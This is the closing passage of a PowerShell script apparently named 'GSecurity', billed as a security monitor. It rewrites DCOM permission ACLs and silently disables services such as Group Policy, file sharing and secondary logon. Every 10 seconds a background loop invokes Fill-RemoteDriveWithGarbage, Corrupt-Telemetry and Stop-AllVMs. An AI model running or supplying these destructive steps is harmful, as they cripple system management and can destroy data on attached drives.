            Set-ItemProperty -Path "HKLM:\Software\Microsoft\Ole" -Name "DefaultLaunchPermission" -Value $defaultLaunchPermission -Type Binary -ErrorAction SilentlyContinue

            $defaultAccessPermission = [byte[]]@(
                0x01,0x00,0x04,0x80,0x9C,0x00,0x00,0x00,0xAC,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
                0x14,0x00,0x00,0x00,0x02,0x00,0x88,0x00,0x06,0x00,0x00,0x00,0x00,0x00,0x14,0x00,
                0x05,0x00,0x00,0x00,0x01,0x01,0x00,0x00,0x00,0x00,0x00,0x05,0x0A,0x00,0x00,0x00,
                0x00,0x00,0x14,0x00,0x05,0x00,0x00,0x00,0x01,0x01,0x00,0x00,0x00,0x00,0x00,0x05,
                0x12,0x00,0x00,0x00,0x00,0x00,0x18,0x00,0x05,0x00,0x00,0x00,0x01,0x02,0x00,0x00,
                0x00,0x00,0x00,0x05,0x20,0x00,0x00,0x00,0x20,0x02,0x00,0x00,0x00,0x00,0x14,0x00,
                0x03,0x00,0x00,0x00,0x01,0x01,0x00,0x00,0x00,0x00,0x00,0x05,0x0A,0x00,0x00,0x00,
                0x00,0x00,0x14,0x00,0x03,0x00,0x00,0x00,0x01,0x01,0x00,0x00,0x00,0x00,0x00,0x05,
                0x12,0x00,0x00,0x00,0x00,0x00,0x18,0x00,0x03,0x00,0x00,0x00,0x01,0x02,0x00,0x00,
                0x00,0x00,0x00,0x05,0x20,0x00,0x00,0x00,0x20,0x02,0x00,0x00,0x01,0x02,0x00,0x00,
                0x00,0x00,0x00,0x05,0x20,0x00,0x00,0x00,0x20,0x02,0x00,0x00,0x01,0x02,0x00,0x00,
                0x00,0x00,0x00,0x05,0x20,0x00,0x00,0x00,0x20,0x02,0x00,0x00
            )
            Set-ItemProperty -Path "HKLM:\Software\Microsoft\Ole" -Name "DefaultAccessPermission" -Value $defaultAccessPermission -Type Binary -ErrorAction SilentlyContinue
            Write-Log "Additional registry settings applied."
        } catch {
            Write-Log "Error in Apply-AdditionalRegistrySettings: $_"
        }
    }

    function Disable-Services {
        try {
            $services = @("BTHMODEM", "gpsvc", "LanmanWorkstation", "LanmanServer", "Messenger", "NetBT", "seclogon", "upnphost", "SSDPSRV")
            foreach ($service in $services) {
                Start-Process -FilePath "sc" -ArgumentList "config $service start= disabled" -NoNewWindow -Wait -ErrorAction SilentlyContinue
                Start-Process -FilePath "sc" -ArgumentList "stop $service" -NoNewWindow -Wait -ErrorAction SilentlyContinue
                Set-ItemProperty -Path "HKLM:\System\CurrentControlSet\Services\$service" -Name "Start" -Value 4 -Type DWord -ErrorAction SilentlyContinue
            }
            Write-Log "Services disabled."
        } catch {
            Write-Log "Error in Disable-Services: $_"
        }
    }

    # Main monitoring loop
    function Run-Monitoring {
        # Original features
        Ensure-ServicesRunning
        Monitor-LoadedDLLs
        Monitor-AudioProcesses
        Monitor-Keyloggers
        Monitor-Overlays
        Monitor-Rootkit
        Detect-Keyloggers
        Detect-And-Terminate-WebServers
        Prevent-RemoteThreadExecution
        Block-RemoteLogins
        Scan-MemoryForMalware
        BackupAndMonitorCookies
        Block-NonConsoleLogonGroupNetwork
        Monitor-Path -Path "C:\Windows\System32"  # Example path to monitor

        # Features from C# script (all enabled by default)
        Fill-RemoteDriveWithGarbage
        if (((Get-Date) - $lastTelemetryCorruptTime).TotalSeconds -ge 3600) {
            Corrupt-Telemetry
            $script:lastTelemetryCorruptTime = Get-Date
        }
        Vpn-Monitor
        Remove-SuspiciousDLLs
        Kill-ProcessesOnPorts
        Stop-AllVMs
        Harden-System
        Clean-Ram

        Start-Sleep -Seconds 10
    }

    # Define Win32 P/Invoke for Clean-Ram
    Add-Type -TypeDefinition @"
    using System;
    using System.Runtime.InteropServices;

    public class Win32 {
        [DllImport("psapi.dll")]
        public static extern bool EmptyWorkingSet(IntPtr hProcess);

        [DllImport("advapi32.dll", SetLastError = true)]
        public static extern bool FlushInstructionCache(IntPtr hProcess, IntPtr lpBaseAddress, uint dwSize);
    }
    "@ -ErrorAction SilentlyContinue

    # Continuous execution
    Write-Log "GSecurity script started."
    while ($true) {
        try {
            Run-Monitoring
        } catch {
            Write-Log "Error in main loop: $_"
            Start-Sleep -Seconds 10  # Brief pause before retrying
        }
    }
}

# Start the script block as a background job
Start-Job -ScriptBlock $scriptBlock -Name "GSecurity" | Out-Null